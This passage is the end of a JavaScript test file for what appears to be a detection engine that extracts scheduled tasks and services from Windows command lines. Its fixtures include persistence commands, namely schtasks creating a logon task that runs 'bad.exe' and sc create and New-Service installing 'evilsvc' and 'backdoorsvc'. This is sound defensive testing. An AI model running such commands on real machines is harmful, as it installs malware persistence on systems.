  { const t=P('schtasks /create /tn "EvilTask" /tr "C:\\temp\\bad.exe" /sc onlogon').tasks[0]; ok(t&&t.name==="EvilTask"&&/bad\.exe/.test(t.cmd), "schtasks /create -> task name+cmd"); }
  ok(P('schtasks /query').tasks.length===0, "schtasks /query -> no task");
  // service
  { const s=P('sc create evilsvc binPath= C:\\temp\\evil.exe start= auto').services[0]; ok(s&&s.name==="evilsvc"&&/evil\.exe/.test(s.path), "sc create -> service name+path"); }
  { const s=P('New-Service -Name backdoorsvc -BinaryPathName C:\\temp\\b.exe').services[0]; ok(s&&s.name==="backdoorsvc", "New-Service -> service"); }
  // benign command -> nothing
  const none=P('cmd.exe /c dir C:\\Users');
  ok(none.accounts.length===0&&none.groups.length===0&&none.tasks.length===0&&none.services.length===0, "benign command -> no artifacts");
})();

/* ---- summary ---- */
console.log("\nengine.cjs tests: "+passed+" passed, "+failed+" failed");
if(failed){ console.log("\nFAILURES:"); for(const f of fails) console.log("  ✗ "+f); process.exit(1); }
else console.log("ALL GREEN ✅");
